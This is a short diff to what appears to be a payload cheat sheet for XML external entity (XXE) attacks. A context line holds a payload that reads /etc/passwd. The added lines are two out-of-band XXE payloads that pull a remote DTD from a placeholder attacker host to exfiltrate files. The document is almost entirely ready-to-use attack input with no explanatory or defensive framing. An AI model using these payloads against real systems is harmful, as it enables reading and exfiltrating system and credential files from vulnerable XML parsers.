@@ -38,3 +38,20 @@ XXE: Local File Inclusion Example
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<?xml version="1.0" encoding="utf-8"?>
+	<!DOCTYPE reset [
+	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
+	%remote;
+	%int;
+	%trick; ]>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<?xml version="1.0" encoding="utf-8"?>
+	<!DOCTYPE xxe [
+	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
+	%remote;
+	%intern;
+	%xxe; 
+	]>
